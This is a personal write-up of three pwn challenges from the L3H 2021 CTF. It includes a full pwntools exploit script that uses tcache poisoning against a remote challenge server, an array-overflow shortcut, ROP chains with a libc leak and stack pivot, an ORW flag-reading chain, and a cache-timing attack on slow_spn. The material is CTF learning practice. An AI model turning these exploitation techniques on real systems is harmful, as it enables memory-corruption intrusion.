---
title: L3H 2021 binary challenge notes
translation_id: l3h-pwn
source_digest: c32edaf66a1757d6b65c3d84731782bee8cea01e1132fa6500d70fdea5cc0086
tags:
  - Pwn
  - CTF Reproduction
categories:
  - Cybersecurity
  - CTF
sections: {"spn-26-november": "spn1126", "checkin-27-november": "checkin1127", "about-addresssanitizer": "关于asan", "about-orw": "关于orw", "analysis": "分析", "slow_spn-29-november": "slow_spn1129"}
---

## spn (26 November)

I started with 0RAYS’ solution. The idea was to decrypt the SPN-encoded shell address, use tcache to write to the challenge’s `shell` variable, then select option 5 to trigger the backdoor.
I could follow the script, and it helped me understand tcache a little better. What I couldn’t find was a working SPN decryption script, so I ended up trying another approach.
Here’s the script from 0RAYS:

```python
#!/usr/bin/python
# -*- coding:utf-8 -*-

from pwn import *
import sys
context.log_level = 'debug'
context.arch='amd64'

local=0
binary_name='SPN_ENC'
libc_name='lib/libc-2.27.so'
if local:
    p=process("./"+binary_name)
    libc=ELF("./"+libc_name)
else:
    p=remote('124.71.194.126',9999)
    e=ELF("./"+binary_name)
    libc=ELF("./"+libc_name)

def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()

def leak_address():
    if(context.arch=='i386'):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b'\x00'))

def cho(num):
    sla("0.exit\n",str(num))
def add(size,idx):
    cho(1)
    sla("Size:",str(size))
    sla("Index:",str(idx))
def delete(idx):
    cho(3)
    sla("Index:",str(idx))
def show(idx):
    cho(4)
    sla("Index:",str(idx))
def edit(idx,size,data):
    cho(2)
    sla("Index:",str(idx))
    sla("Size",str(size))
    sa("Content",data)
def backdoor():
    cho(5)
def decrypt(x):
    io = process('./spn_dec.py')
    io.sendline(str(x&0xffff))
    a = int(io.recv()[:-1])
    io.close()
    return a
def spn_dec(x):
    a1 = decrypt(x)
    a2 = decrypt(x>>16)
    a3 = decrypt(x>>32)
    aa = a1+a2*0x10000+a3*0x100000000
    print(hex(a3),hex(a2),hex(a1))
    print(aa)
    return aa

ru("gift:")
shell_addr=int(ru('\n'),16)
print(hex(shell_addr))
aa = spn_dec(shell_addr)
print(hex(aa))
add(0x10,0)
add(0x10,1)
add(0x10,2)
delete(2)
delete(1)
edit(0,0x26,b'a'*0x20+p64(aa)[:-2])
add(0x10,3)
add(0x10,4)
edit(4,2,b'aa')
backdoor()
ia()
```
I later found a simpler route: an input of `0x1000` let me write past the end of the array and overwrite `shell`, which was enough to trigger the backdoor.

![image-20211129232554399](https://res.cloudinary.com/sycamore/image/upload/v1792696482/Typora/2021/11/0a873d7de40231b015e0a70c0c4466c6.png)

```python
add(0,0x1000)
add(1,0x20)
edit(0,0x1000+2,'\n')
backdoor()
```

## checkin (27 November)

### About AddressSanitizer
The challenge used AddressSanitizer (ASan), which tracks memory using shadow memory. I used [these notes](https://bestwing.me/ASan-and-ASan-in-CTF%280ctf-babyaegis%29.html) for background.
Here are the main points I wrote down.
ASan is an open-source memory error detector developed at Google. Its two main components are compiler instrumentation and a runtime library.
LLVM instruments memory operations such as loads, stores and stack allocations.
The runtime handles operations such as marking shadow memory accessible or inaccessible and intercepting allocation functions such as `malloc` and `free`.
ASan uses a direct mapping for shadow memory. These are the example mappings in the notes:
**64-bit**
> Shadow = (Mem >> 3) + 0x7fff8000;

**32-bit**
> Shadow = (Mem >> 3) + 0x20000000;

### About ORW
**Background**
Some pwn challenges install a seccomp filter at startup that allows only three system calls: `open`, `read` and `write`. With that restriction, `system("/bin/sh")` can’t start a shell. ORW takes its name from the three calls we can still use to retrieve the flag.

**How it works**

First, open the flag file. Then read its contents into a buffer and write them to standard output. Here’s the pseudocode from my notes:

```python
sys_open("flag")//读取flag
sys_read("rax","rsp",0x40)//rax为sysoopen的返回值，也就是flag，然后将flag写到esp下
sys_write(1,"rsp",0x40)//打印flag的值到屏幕输出
```
I still had some catching up to do here. For a worked example, see [this walkthrough of pwnable.tw’s ORW challenge](https://x64.moe/posts/orw/).

### Analysis
The challenge lets us write one byte at an arbitrary address. I changed the second byte of `_ZN14__interception21real___isoc99_vfscanfE` so the pointer would point to `gets` (0x73ED28).

![image-20211129232602805](https://res.cloudinary.com/sycamore/image/upload/v1792696482/Typora/2021/11/38fe2a7349d7b29477d22b0f72026408.png)

```python
sla(b'Welcome! A gift for you:',str(0x73edb8+1))
sleep(1)
sd(b'\x91')
sa(b'Leave a note.',b'a'*0x1f)
sa(b"That's all. Have fun!",p64(0x43FBB3))
```
I then built a ROP chain, called `gets` and leaked an address to calculate the libc base.
```python
pop_rdi = 0x41af0b
pop_rsp = 0x484d50
call_puts = 0x43A286
rop = p64(pop_rdi)+p64(0x72DE30)+p64(call_puts)+b'a'*0x838+p64(0)*6+p64(pop_rdi)+p64(0xA00000)+p64(0x43FBB3)+b'a'*0x30+p64(0)*3+p64(pop_rsp)+p64(0xA00000)
try:
    p.recv()
    sl(rop)
    libc_addr = leak_address()-0x407e0
    print(hex(libc_addr))
    if libc_addr == 0x736572605c61:
        p.close()
        return 0
except Exception:
    return 0
print(hex(libc_addr))
```
Finally, I used a stack pivot and an ORW chain to read the flag file.
```python
binsh=libc_addr+0x1B3E1A
system=libc_addr+0x4f550
pop_rsi=0x000000000041ab7c
pop_rdx=0x000000000043ced2
open_addr=libc_addr+libc.sym['open']
read_addr=libc_addr+libc.sym['read']
write_addr=libc_addr+libc.sym['write']
rop2 = p64(pop_rdi)+p64(0xA00100)+p64(pop_rsi)+p64(0)+p64(open_addr)
rop2 += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0xA00200)+p64(pop_rdx)+p64(0x100)+p64(read_addr)
rop2 += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0xA00200)+p64(pop_rdx)+p64(0x100)+p64(write_addr)
rop2 = rop2.ljust(0x100,b'\x00')+b'/flag\x00'
sl(rop2)
```
## slow_spn (29 November)
I thought this challenge was a little odd.
Apart from using pwntools, the reasoning felt closer to a cryptography puzzle than to the other binary challenges.
The program derived a key and plaintext from the flag file and passed values through substitution and permutation boxes, with a simulated cache.
![image-20211129232612526](https://res.cloudinary.com/sycamore/image/upload/v1792696485/Typora/2021/11/d98248de6bbcdd6c0a8ae6fa6d3523de.png)
The challenge implements its own cache. It holds up to `0x20` values representing S-box addresses and evicts the smallest value when full. On a hit, the algorithm updates a counter. On a miss, it calls `sleep(1)`.

We get one lookup at the plaintext’s S-box address. By trying candidate values and watching for the one-second delay, we can tell which lookups hit the cache. That gives us `p`, `v9`, `v7` and `v5` from the screenshot, along with `k >> 8`, `k >> 4` and `k`. Putting the recovered pieces together gives us the key.

![image-20211129232621850](https://res.cloudinary.com/sycamore/image/upload/v1792696486/Typora/2021/11/f5836a7db5ff249e037d1a839c975876.png)
